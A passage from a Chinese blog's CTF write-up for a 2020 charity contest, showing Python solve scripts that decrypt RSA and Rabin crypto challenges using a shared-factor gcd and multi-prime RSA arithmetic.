(20983496766673618262715503853344613375043418407954589711036976457109181277047785476689615655807908465268477553479694808953488768860716696125737364358036401649980246090684670436058731030372949252949507412943053045214182742536613888598591569240175333698714988951971629691491682329057973113710029764801625129848524382506085422964583009216559589212838783369570732651945521377570516842490564224284945383046068592448450716584963006018470532289539101534613293900400755016511341043904031281127245880276684317776530036541115701776255070403521237654065598193436536158723942687958161706429347974994852399491148376284992283219059, 30587889392885476255415494083607304058158992818054979971876096375417191315158126483000902958669225479595762518708760613966903169454507079315520967778387632753558492708664868579515510043592707782095243918239255416554376922319356163495326158933213851859312801371400039602934010020484567730393318891743886323079024885360722679374634107414047225721753243055134720965366096775909092305499834607102499564141708419303112963541420207140198639429581312270591582850267654815484203793418740472307729997009732030391681164501610370090359081174864977073291405845914447185720058491663645821946252109246589897902567560825087599030607)</span></span><br><span class="line"><span class="string">seed2=2020*p-2019*q</span></span><br><span class="line"><span class="string">if seed2&lt;0:</span></span><br><span class="line"><span class="string">    seed2=(-1)*seed2</span></span><br><span class="line"><span class="string">Q = sympy.nextprime(seed2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(Q)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">19370285215555067668998564771047027875835301315584733346923146138606763085667730706265799448821191143461519867244004165513130186030002066964047357941331099196474499675611335381203178096660319521092292496780089534690637866238820039127908545021004592832548268285873987981510567926661236557969850717531623724002531990881006535268928584251510978522285455321784121672144196207868013342973226338684356946249050741827114625888502126058750577783455684374405552095880869939109698550226293825712270185803746647452213597315697619624399742676939488649762840052159465827346433864993414267522200099079263156893164185210167450340297901</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(ciphertext, d, n)))</span><br></pre></td></tr></table></figure>
<h3 id="warm_up">warm_up</h3>
<p>gcd求p,q</p>
<p>e1是偶数，Rabin密码解出s</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>())</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855</span></span><br><span class="line">n1 = <span class="number">15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121</span></span><br><span class="line">n2 = <span class="number">16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571</span></span><br><span class="line">key_encode = <span class="number">154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993</span></span><br><span class="line">enc = <span class="number">17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = math.gcd(n1,n2)</span><br><span class="line">q = n1 // p</span><br><span class="line">r = n2 // p</span><br><span class="line">phi1 = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e1=<span class="number">125794</span></span><br><span class="line">e2=<span class="number">42373</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1 = e1 // <span class="number">2</span></span><br><span class="line">d1 = inverse(e1, phi1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(e1*d1 % phi1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sp = <span class="built_in">pow</span>(c1, (p+<span class="number">1</span>)//<span class="number">4</span>, p)</span><br><span class="line">sq = <span class="built_in">pow</span>(c1, (q+<span class="number">1</span>)//<span class="number">4</span>, q)</span><br><span class="line">yp = inverse(p, q)</span><br><span class="line">yq = -(yp * p - <span class="number">1</span>) // q</span><br><span class="line">r1 = (yp*p*sq + yq*q*sp) % n1</span><br><span class="line">r2 = n1 - r1</span><br><span class="line">r3 = (yp*p*sq - yq*q*sp) %n1</span><br><span class="line">r4 = n1 - r3</span><br><span class="line"></span><br><span class="line">sc = [r1,r2,r3,r4]</span><br><span class="line">ss = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sc:</span><br><span class="line">    s = <span class="built_in">pow</span>(i, d1, n1)</span><br><span class="line">    n3 = p*q*s</span><br><span class="line">    phi2 = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(s-<span class="number">1</span>)</span><br><span class="line">    d2 = inverse(e2, phi2)</span><br><span class="line">    key = <span class="built_in">pow</span>(key_encode, d2, n3)</span><br><span class="line">    dec = key ^ enc</span><br><span class="line">    low200 = dec &amp; ((<span class="number">1</span>&lt;&lt;<span class="number">200</span>)-<span class="number">1</span>)</span><br><span class="line">    low135 = dec &amp; ((<span class="number">1</span>&lt;&lt;<span class="number">135</span>)-<span class="number">1</span>)</span><br><span class="line">    high135 = dec &gt;&gt; <span class="number">200</span></span><br><span class="line">    high135 ^= low135</span><br><span class="line">    res = high135 &lt;&lt; <span class="number">200</span> | low200</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(res))</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Apeng
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="http://apeng.re/2020/02/24/2020gongyi/" title="2020 新春抗疫公益赛">http://apeng.re/2020/02/24/2020gongyi/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/VM/" rel="tag"># VM</a>
              <a href="/tags/nisi/" rel="tag"># nisi</a>
              <a href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" rel="tag"># 信号量</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/02/11/programming-language-note-2/" rel="prev" title="编译原理学习笔记（二）">
                  <i class="fa fa-angle-left"></i> 编译原理学习笔记（二）
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/03/11/2020npointer-3/" rel="next" title="空指针3月公开赛write up">
                  空指针3月公开赛write up <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Apeng</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/Apeng7364" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
